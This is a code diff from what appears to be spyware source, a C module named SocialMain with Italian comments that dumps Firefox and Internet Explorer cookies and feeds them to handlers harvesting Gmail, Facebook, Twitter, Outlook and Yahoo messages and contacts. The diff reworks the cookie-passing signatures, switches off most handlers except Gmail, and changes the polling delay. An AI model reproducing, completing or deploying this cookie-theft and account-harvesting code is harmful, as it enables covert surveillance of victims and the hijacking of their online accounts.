@@ -16,14 +16,14 @@
 #include "SocialMain.h"
 #include "NetworkHandler.h"
 
-extern DWORD HandleGMail(char *); // Handler per GMail
-extern DWORD HandleFBMessages(char *); // Handler per FaceBook
-extern DWORD HandleFBContacts(char *); // Handler per FaceBook
-extern DWORD HandleTwitterContacts(char *); // Handler per Twitter
-extern DWORD HandleTwitterTweets(char *); // Handler per Twitter
-extern DWORD HandleOutlookMail(char *); // Handle per Outlook Live
-extern DWORD YahooMessageHandler(char *); // Handler per Yahoo
-extern DWORD YahooContactHandler(char *); // Handler per Yahoo
+extern DWORD HandleGMail(char **); // Handler per GMail
+extern DWORD HandleFBMessages(char **); // Handler per FaceBook
+extern DWORD HandleFBContacts(char **); // Handler per FaceBook
+extern DWORD HandleTwitterContacts(char **); // Handler per Twitter
+extern DWORD HandleTwitterTweets(char **); // Handler per Twitter
+extern DWORD HandleOutlookMail(char **); // Handle per Outlook Live
+extern DWORD YahooMessageHandler(char **); // Handler per Yahoo
+extern DWORD YahooContactHandler(char **); // Handler per Yahoo
 
 extern int DumpFFCookies(void); // Cookie per Facebook
 extern int DumpIECookies(WCHAR *); // Cookie per IExplorer
@@ -204,21 +204,21 @@ void InitSocialEntries()
 		social_entry[i].wait_cookie = TRUE;
 	}
 	wcscpy_s(social_entry[0].domain, FACEBOOK_DOMAIN);
-	social_entry[0].RequestHandler = HandleFBMessages;
+	social_entry[0].RequestHandler = 0;//HandleFBMessages;
 	wcscpy_s(social_entry[1].domain, GMAIL_DOMAIN);
 	social_entry[1].RequestHandler = HandleGMail;
 	wcscpy_s(social_entry[2].domain, FACEBOOK_DOMAIN);
-	social_entry[2].RequestHandler = HandleFBContacts;
+	social_entry[2].RequestHandler = 0;//HandleFBContacts;
 	wcscpy_s(social_entry[3].domain, TWITTER_DOMAIN);
-	social_entry[3].RequestHandler = HandleTwitterContacts;
+	social_entry[3].RequestHandler = 0;//HandleTwitterContacts;
 	wcscpy_s(social_entry[4].domain, TWITTER_DOMAIN);
-	social_entry[4].RequestHandler = HandleTwitterTweets;
+	social_entry[4].RequestHandler = 0;//HandleTwitterTweets;
 	wcscpy_s(social_entry[5].domain, OUTLOOK_DOMAIN);
-	social_entry[5].RequestHandler = HandleOutlookMail;
+	social_entry[5].RequestHandler = 0;//HandleOutlookMail;
 	wcscpy_s(social_entry[6].domain, YAHOO_DOMAIN);
-	social_entry[6].RequestHandler = YahooMessageHandler;
+	social_entry[6].RequestHandler = 0;//YahooMessageHandler;
 	wcscpy_s(social_entry[7].domain, YAHOO_DOMAIN);
-	social_entry[7].RequestHandler = YahooContactHandler;
+	social_entry[7].RequestHandler = 0;//YahooContactHandler;
 
 	// Azzera i cookie in shared mem relativi a IExplorer
 	ZeroMemory(FACEBOOK_IE_COOKIE, sizeof(FACEBOOK_IE_COOKIE));
@@ -231,7 +231,7 @@ void InitSocialEntries()
 void SocialMainLoop()
 {
 	DWORD i, ret;
-	char *str;
+	char **str;
 
 	//MessageBoxA(0, 0, 0, 0);
 	InitSocialEntries();
@@ -240,7 +240,8 @@ void SocialMainLoop()
 	static int itry = 0;
 	for (;;) {
 		// Busy wait...
-		for (int j=0; j<SLEEP_COOKIE; j++) {Sleep(40);}
+		for (int j=0; j<SLEEP_COOKIE; j++) 
+		{Sleep(500);}
 
 		wchar_t szLogW[MAX_PATH * 2] = { 0 }; void putlogW(wchar_t*);
 		swprintf(szLogW, L"in SocialMainLoop after wait");
@@ -266,11 +267,15 @@ void SocialMainLoop()
 			if (social_entry[i].idle == 0) { 
 				char domain_a[64];
 				_snprintf_s(domain_a, sizeof(domain_a), _TRUNCATE, "%S", social_entry[i].domain);		
- 				if (str = GetCookieString(domain_a)) {
+ 				if (str = GetCookieStringNew(domain_a)) {
 					if (social_entry[i].RequestHandler)// !IsCrisisNetwork() && , rem by fhc
 						ret = social_entry[i].RequestHandler(str);
 					 else
 						ret = SOCIAL_REQUEST_NETWORK_PROBLEM;
+					for (int i = 0; i < COOKIE_FROM_NONE_MAX;i++)
+					{
+						SAFE_FREE(str[i]);
+					}
 					SAFE_FREE(str);
 
 					if (ret == SOCIAL_REQUEST_SUCCESS) {
